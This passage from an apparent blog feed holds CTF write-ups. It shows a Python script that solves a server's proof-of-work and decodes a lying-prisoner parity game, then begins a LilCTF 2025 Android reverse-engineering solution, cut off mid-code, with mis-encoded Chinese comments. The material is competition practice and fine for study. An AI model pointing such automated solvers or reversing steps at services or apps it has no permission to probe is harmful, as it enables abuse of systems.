<span class="keyword">in</span> <span class="built_in">range</span>(c, n+<span class="number">1</span>):</span><br><span class="line">                    M[i][j] ^= M[r][j]</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> r == m: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, m):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(M[i][j]==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)) <span class="keyword">and</span> M[i][n]==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    x = [<span class="number">0</span>]*n</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(pivs):</span><br><span class="line">        x[c] = M[i][n]</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rows_to_bitmasks</span>(<span class="params">rows</span>):</span><br><span class="line">    masks = []</span><br><span class="line">    <span class="keyword">for</span> mask_list <span class="keyword">in</span> rows:</span><br><span class="line">        v = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> mask_list:</span><br><span class="line">            v |= (<span class="number">1</span> &lt;&lt; j)</span><br><span class="line">        masks.append(v)</span><br><span class="line">    <span class="keyword">return</span> masks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict_all</span>(<span class="params">bitmasks, sol_bits</span>):</span><br><span class="line">    sv = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(sol_bits):</span><br><span class="line">        <span class="keyword">if</span> b: sv |= (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="keyword">return</span> [ (m &amp; sv).bit_count() &amp; <span class="number">1</span> <span class="keyword">for</span> m <span class="keyword">in</span> bitmasks ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_responses</span>(<span class="params">rows, responses, max_err=<span class="number">3</span></span>):</span><br><span class="line">    n = <span class="built_in">len</span>(rows)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(responses) == n</span><br><span class="line">    A_full = [[<span class="number">1</span> <span class="keyword">if</span> j <span class="keyword">in</span> rows[i] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    b_full = responses</span><br><span class="line">    bitmasks = rows_to_bitmasks(rows)</span><br><span class="line">    idxs = <span class="built_in">range</span>(n)</span><br><span class="line">    <span class="keyword">for</span> ecount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_err+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> errs <span class="keyword">in</span> itertools.combinations(idxs, ecount):</span><br><span class="line">            good = [i <span class="keyword">for</span> i <span class="keyword">in</span> idxs <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> errs]</span><br><span class="line">            A = [A_full[i] <span class="keyword">for</span> i <span class="keyword">in</span> good]</span><br><span class="line">            b = [b_full[i] <span class="keyword">for</span> i <span class="keyword">in</span> good]</span><br><span class="line">            sol = solve_gf2(A, b)</span><br><span class="line">            <span class="keyword">if</span> sol <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">            pred = predict_all(bitmasks, sol)</span><br><span class="line">            diff = [i <span class="keyword">for</span> i <span class="keyword">in</span> idxs <span class="keyword">if</span> pred[i] != b_full[i]]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">set</span>(diff) == <span class="built_in">set</span>(errs):</span><br><span class="line">                <span class="keyword">return</span> sol, errs</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- å¹¶è¡Œ PoW ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_pow_worker</span>(<span class="params">prefixes, suffix, target, found_evt: Event, outq: Queue</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> prefixes:</span><br><span class="line">        <span class="keyword">if</span> found_evt.is_set(): <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> ALPHABET:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> ALPHABET:</span><br><span class="line">                    <span class="keyword">if</span> found_evt.is_set(): <span class="keyword">return</span></span><br><span class="line">                    xxxx = <span class="string">f&quot;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span>&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> sha256((xxxx + suffix).encode()).hexdigest() == target:</span><br><span class="line">                        outq.put(xxxx); found_evt.<span class="built_in">set</span>(); <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow_parallel</span>(<span class="params">suffix, target</span>):</span><br><span class="line">    nprocs = <span class="built_in">min</span>(<span class="built_in">max</span>(<span class="number">4</span>, cpu_count()), <span class="number">32</span>)</span><br><span class="line">    chunk = (<span class="built_in">len</span>(ALPHABET) + nprocs - <span class="number">1</span>) // nprocs</span><br><span class="line">    found_evt = Event(); outq = Queue(); procs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nprocs):</span><br><span class="line">        seg = ALPHABET[i*chunk:(i+<span class="number">1</span>)*chunk]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seg: <span class="keyword">continue</span></span><br><span class="line">        p = Process(target=_pow_worker, args=(seg, suffix, target, found_evt, outq))</span><br><span class="line">        p.daemon = <span class="literal">True</span>; p.start(); procs.append(p)</span><br><span class="line">    xxxx = <span class="literal">None</span></span><br><span class="line">    deadline = time.time() + POW_WAIT_MAX</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> time.time() &lt; deadline <span class="keyword">and</span> <span class="keyword">not</span> found_evt.is_set():</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        <span class="keyword">if</span> found_evt.is_set():</span><br><span class="line">            xxxx = outq.get_nowait()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> procs: p.terminate()</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> procs:</span><br><span class="line">            <span class="keyword">try</span>: p.join(timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- å›ç­”è§£æ ----------</span></span><br><span class="line">RE_PR_LINE = re.<span class="built_in">compile</span>(<span class="string">r&quot;Prisoner&#x27;?s?\s+response:\s*([A-Za-z0-9_!]+)&quot;</span>, re.I)</span><br><span class="line">RE_TRUE = re.<span class="built_in">compile</span>(<span class="string">r&quot;\btrue\b&quot;</span>, re.I)</span><br><span class="line">RE_FALSE = re.<span class="built_in">compile</span>(<span class="string">r&quot;\bfalse\b&quot;</span>, re.I)</span><br><span class="line">RE_YES = re.<span class="built_in">compile</span>(<span class="string">r&quot;\byes\b|\bon\b|\b1\b&quot;</span>, re.I)</span><br><span class="line">RE_NO = re.<span class="built_in">compile</span>(<span class="string">r&quot;\bno\b|\boff\b|\b0\b&quot;</span>, re.I)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_bool</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    m = RE_PR_LINE.search(text)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        tok = m.group(<span class="number">1</span>).lower()</span><br><span class="line">        <span class="keyword">if</span> tok <span class="keyword">in</span> (<span class="string">&quot;true&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;on&quot;</span>): <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tok <span class="keyword">in</span> (<span class="string">&quot;false&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;no&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;off&quot;</span>): <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> tok.startswith(<span class="string">&quot;t&quot;</span>): <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tok.startswith(<span class="string">&quot;f&quot;</span>): <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> RE_TRUE.search(text): <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> RE_FALSE.search(text): <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> RE_YES.search(text): <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> RE_NO.search(text): <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- åŒæ­¥+è§£é¢˜ ----------</span></span><br><span class="line">PROMPT_PATTERNS = [</span><br><span class="line">    <span class="string">r&quot;Ask your question&quot;</span>,</span><br><span class="line">    <span class="string">r&quot;\byou may ask\b&quot;</span>,</span><br><span class="line">    <span class="string">r&quot;\bquestion\b&quot;</span>,</span><br><span class="line">    <span class="string">r&quot;\bquery\b&quot;</span>,</span><br><span class="line">    <span class="string">r&quot;\bstart\b&quot;</span>,</span><br><span class="line">    <span class="string">r&quot;\bS0\b&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SUBMIT_PATTERNS = [<span class="string">r&quot;\banswer\b&quot;</span>, <span class="string">r&quot;\bsubmit\b&quot;</span>, <span class="string">r&quot;\benter\b&quot;</span>, <span class="string">r&quot;\binput\b&quot;</span>]</span><br><span class="line">RESULT_PATTERNS = [<span class="string">r&quot;correct&quot;</span>, <span class="string">r&quot;scowls&quot;</span>, <span class="string">r&quot;\bnext\b&quot;</span>, <span class="string">r&quot;\bround\b&quot;</span>, <span class="string">r&quot;gift&quot;</span>, <span class="string">r&quot;congrat&quot;</span>, <span class="string">r&quot;success&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complete_round</span>(<span class="params">io: LineIO, round_idx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    rows, queries = build_queries(N_QUERIES, seed=SEED_BASE + round_idx)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰ç¬¬ä¸€æ¡â€œå¯æé—®â€æç¤º</span></span><br><span class="line">    io.read_until_any(PROMPT_PATTERNS, timeout=READ_TIMEOUT, max_lines=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    responses = []</span><br><span class="line">    <span class="keyword">for</span> idx, q <span class="keyword">in</span> <span class="built_in">enumerate</span>(queries):</span><br><span class="line">        <span class="comment"># æ¯é¢˜éƒ½ç­‰æç¤ºï¼Œç¡®ä¿åŒæ­¥</span></span><br><span class="line">        io.read_until_any(PROMPT_PATTERNS, timeout=PROMPT_TIMEOUT, max_lines=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å‘é—®</span></span><br><span class="line">        io.writeln(q)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¯»å–å›ç­”</span></span><br><span class="line">        ans_blob, _ = io.read_until_any(</span><br><span class="line">            patterns=[<span class="string">r&quot;Prisoner&#x27;?s?\s+response&quot;</span>, <span class="string">r&quot;\btrue\b&quot;</span>, <span class="string">r&quot;\bfalse\b&quot;</span>, <span class="string">r&quot;\b(?:yes|no)\b&quot;</span>, <span class="string">r&quot;\b[01]\b&quot;</span>],</span><br><span class="line">            timeout=PER_Q_TIMEOUT, max_lines=<span class="number">8</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ans_blob:</span><br><span class="line">            <span class="comment"># çŸ­è¡¥è¯»ï¼Œå…œåº•</span></span><br><span class="line">            ans_blob = io.read_some_lines(<span class="number">3</span>, timeout=PER_Q_TIMEOUT)</span><br><span class="line"></span><br><span class="line">        bit = parse_bool(ans_blob)</span><br><span class="line">        responses.append(bit)</span><br><span class="line">        <span class="keyword">if</span> VERBOSE:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[A<span class="subst">&#123;idx:02d&#125;</span>] bit=<span class="subst">&#123;bit&#125;</span> | raw=<span class="subst">&#123;ans_blob.strip()[:<span class="number">120</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£ç  + æ ¡éªŒ</span></span><br><span class="line">    sol, errs = decode_from_responses(rows, responses, max_err=MAX_ERROR_BITS)</span><br><span class="line">    <span class="keyword">if</span> sol <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æäº¤ç­”æ¡ˆ</span></span><br><span class="line">    io.read_until_any(SUBMIT_PATTERNS, timeout=READ_TIMEOUT, max_lines=<span class="number">20</span>)</span><br><span class="line">    io.writeln(<span class="string">&quot; &quot;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> sol))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»ç»“æœ</span></span><br><span class="line">    res, _ = io.read_until_any(RESULT_PATTERNS, timeout=READ_TIMEOUT, max_lines=<span class="number">40</span>)</span><br><span class="line">    low = (res <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line">    ok = <span class="built_in">any</span>(k <span class="keyword">in</span> low <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">&quot;scowls&quot;</span>,<span class="string">&quot;correct&quot;</span>,<span class="string">&quot;next&quot;</span>,<span class="string">&quot;round&quot;</span>,<span class="string">&quot;gift&quot;</span>,<span class="string">&quot;success&quot;</span>,<span class="string">&quot;congrat&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> ok</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_pow</span>(<span class="params">io: LineIO, banner: <span class="built_in">str</span></span>):</span><br><span class="line">    m = re.search(<span class="string">r&quot;sha256\(XXXX\+([^\)]+)\)\s*==\s*([0-9a-fA-F]&#123;64&#125;)&quot;</span>, banner)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        extra, _ = io.read_until_any([<span class="string">r&quot;sha256\(XXXX\+&quot;</span>], timeout=READ_TIMEOUT, max_lines=<span class="number">40</span>)</span><br><span class="line">        banner += extra</span><br><span class="line">        m = re.search(<span class="string">r&quot;sha256\(XXXX\+([^\)]+)\)\s*==\s*([0-9a-fA-F]&#123;64&#125;)&quot;</span>, banner)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    suffix, target = m.group(<span class="number">1</span>), m.group(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[POW] suffix=<span class="subst">&#123;suffix&#125;</span> target=<span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">    xxxx = solve_pow_parallel(suffix, target)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> xxxx:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[POW] å¹¶è¡Œæœªæ‰¾åˆ°ï¼›å»ºè®®æé«˜ POW_WAIT_MAX æˆ–æ¢æ›´å¿«çš„æœºå™¨ã€‚&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[POW] solved: <span class="subst">&#123;xxxx&#125;</span>&quot;</span>)</span><br><span class="line">    io.writeln(xxxx)</span><br><span class="line">    ack, _ = io.read_until_any([<span class="string">r&quot;OK&quot;</span>, <span class="string">r&quot;pass&quot;</span>, <span class="string">r&quot;correct&quot;</span>, <span class="string">r&quot;success&quot;</span>, <span class="string">r&quot;failed&quot;</span>, <span class="string">r&quot;invalid&quot;</span>],</span><br><span class="line">                               timeout=READ_TIMEOUT, max_lines=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;failed|invalid&quot;</span>, ack <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, re.I):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[POW] æ ¡éªŒå¤±è´¥&quot;</span>); sys.exit(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(<span class="params">host, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.getaddrinfo(host, port)  <span class="comment"># DNS é¢„çƒ­</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">with</span> closing(socket.create_connection((host, port), timeout=<span class="number">8</span>)) <span class="keyword">as</span> s:</span><br><span class="line">        <span class="comment"># ç½‘ç»œå‚æ•°ä¼˜åŒ–</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPIDLE&quot;</span>): s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, <span class="number">60</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPINTVL&quot;</span>): s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPCNT&quot;</span>): s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        io = LineIO(s)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆå§‹æ¨ªå¹…</span></span><br><span class="line">        banner = io.read_some_lines(<span class="number">40</span>, timeout=READ_TIMEOUT)</span><br><span class="line">        <span class="keyword">if</span> banner:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;== banner ==\n&quot;</span> + banner)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># POW</span></span><br><span class="line">        do_pow(io, banner)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 25 è½®</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">            attempts = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                attempts += <span class="number">1</span></span><br><span class="line">                ok = complete_round(io, r)</span><br><span class="line">                <span class="keyword">if</span> ok:</span><br><span class="line">                    <span class="keyword">if</span> r == <span class="number">9</span>:</span><br><span class="line">                        gift = io.read_some_lines(<span class="number">20</span>, timeout=READ_TIMEOUT)</span><br><span class="line">                        <span class="keyword">if</span> gift.strip():</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;[Gift] &quot;</span> + gift.strip()[:<span class="number">200</span>])</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> attempts &gt; (<span class="number">1</span> + RETRY_PER_ROUND):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] ç¬¬ <span class="subst">&#123;r+<span class="number">1</span>&#125;</span> è½®å¤±è´¥è¿‡å¤šï¼Œé€€å‡ºã€‚&quot;</span>)</span><br><span class="line">                    sys.exit(<span class="number">4</span>)</span><br><span class="line">                <span class="comment"># æ¸…æ®‹ä½™åé‡è¯•</span></span><br><span class="line">                io.read_some_lines(<span class="number">40</span>, timeout=READ_TIMEOUT)</span><br><span class="line"></span><br><span class="line">        final = io.read_some_lines(<span class="number">80</span>, timeout=READ_TIMEOUT)</span><br><span class="line">        <span class="keyword">if</span> final:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;== Final ==\n&quot;</span> + final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- å…¥å£ ----------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        interact(HOST, PORT)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[!] ä¸­æ–­&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">130</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] å¼‚å¸¸ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LilCTF 2025 WriteUp (Reverseæ–¹å‘)</title>
      <link href="/2025/08/20/LilCTF2025/"/>
      <url>/2025/08/20/LilCTF2025/</url>
      
        <content type="html"><![CDATA[<p>LilCTF 2025ï¼š<a href="https://lilctf.xinshi.fun/games/">https://lilctf.xinshi.fun/games/</a></p><h1 id="ASM-ASM"><a href="#ASM-ASM" class="headerlink" title="ASM ASM"></a>ASM ASM</h1><h2 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AppCompatActivity</span> &#123;</span><br><span class="line">    public native <span class="title class_">String</span> <span class="title function_">check</span>(<span class="title class_">String</span> str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="title function_">loadLibrary</span>(<span class="string">&quot;ez_asm_hahaha&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰äº†ä¸€ä¸ª native æ–¹æ³• check(String)ï¼ŒåŠ è½½so</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">void</span> <span class="title function_">m1789lambda$onCreate$1$workpangbaiez_asm_hahahaMainActivity</span>(<span class="title class_">EditText</span> input, <span class="title class_">Button</span> btn, <span class="title class_">View</span> v) &#123;</span><br><span class="line">    <span class="title class_">String</span> txt = input.<span class="title function_">getText</span>().<span class="title function_">toString</span>();   <span class="comment">// è·å–è¾“å…¥</span></span><br><span class="line">    <span class="title class_">Log</span>.<span class="title function_">e</span>(<span class="string">&quot;input1&quot;</span>, txt);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">String</span> enc = <span class="title function_">check</span>(txt);   <span class="comment">// è°ƒç”¨ native å±‚æ ¡éªŒ</span></span><br><span class="line">    <span class="title class_">Log</span>.<span class="title function_">e</span>(<span class="string">&quot;input&quot;</span>, enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enc.<span class="title function_">equals</span>(<span class="string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span>)) &#123;</span><br><span class="line">        <span class="title class_">Snackbar</span>.<span class="title function_">make</span>(btn, <span class="string">&quot;U W1n Th3 G@m3 (:&quot;</span>, -<span class="number">1</span>).<span class="title function_">show</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Snackbar</span>.<span class="title function_">make</span>(btn, <span class="string">&quot;å–µå–µå–µï¼Œä¸å¯¹å‘¢ &gt;_&lt;&quot;</span>, -<span class="number">1</span>).<span class="title function_">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cipher_text =â€KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09Sâ€</p><h2 id="native"><a href="#native" class="headerlink" title="native"></a>native</h2><h3 id="Java-work-pangbai-ez-1asm-1hahaha-MainActivity-check"><a href="#Java-work-pangbai-ez-1asm-1hahaha-MainActivity-check" class="headerlink" title="Java_work_pangbai_ez_1asm_1hahaha_MainActivity_check"></a>Java_work_pangbai_ez_1asm_1hahaha_MainActivity_check</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Java_work_pangbai_ez_1asm_1hahaha_MainActivity_check</span><span class="params">(_JNIEnv *a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// x10</span></span><br><span class="line">  <span class="type">int8x16_t</span> v5; <span class="comment">// q0</span></span><br><span class="line">  <span class="type">int</span> i_2; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [xsp+2Ch] [xbp-1D4h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+7Ch] [xbp-184h]</span></span><br><span class="line">  <span class="type">int8x16_t</span> t; <span class="comment">// [xsp+A0h] [xbp-160h]</span></span><br><span class="line">  <span class="type">char</span> *StringUTFChars_1; <span class="comment">// [xsp+B8h] [xbp-148h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+E0h] [xbp-120h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *StringUTFChars; <span class="comment">// [xsp+110h] [xbp-F0h]</span></span><br><span class="line">  <span class="type">char</span> i_1; <span class="comment">// [xsp+1E7h] [xbp-19h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [xsp+1E8h] [xbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [xsp+1F7h] [xbp-9h] BYREF</span></span><br><span class="line">  __int64 v18; <span class="comment">// [xsp+1F8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = *(_QWORD *)(_ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  StringUTFChars = (<span class="type">const</span> <span class="type">char</span> *)_JNIEnv::<span 